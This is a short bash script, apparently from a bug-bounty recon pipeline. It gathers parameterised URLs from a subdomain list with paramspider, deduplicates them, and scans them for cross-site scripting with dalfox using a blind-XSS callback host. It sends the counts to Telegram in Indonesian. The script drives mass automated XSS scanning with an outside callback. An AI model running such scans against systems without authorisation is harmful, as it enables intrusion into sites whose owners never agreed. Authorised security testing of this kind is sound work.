#!/bin/bash

source ./config.env
source ./modules/utils.sh

results_dir="results"
merged_params="merged-params.txt"
xss_file="dalfoxes.txt"

> "$merged_params"
paramspider -l subs-active.txt

for f in "$results_dir"/*.txt; do
  [[ -f "$f" ]] && cat "$f" >> "$merged_params"
done

sort -u "$merged_params" -o "$merged_params"
total=$(wc -l < "$merged_params")
send_telegram "🔢 Parameter URL ditemukan: $total"

> "$xss_file"
dalfox file "$merged_params" -b hahwul.xss.ht >> "$xss_file"
xss_count=$(grep -c 'POC:' "$xss_file")
send_telegram "🛡️ XSS ditemukan oleh Dalfox: $xss_count"
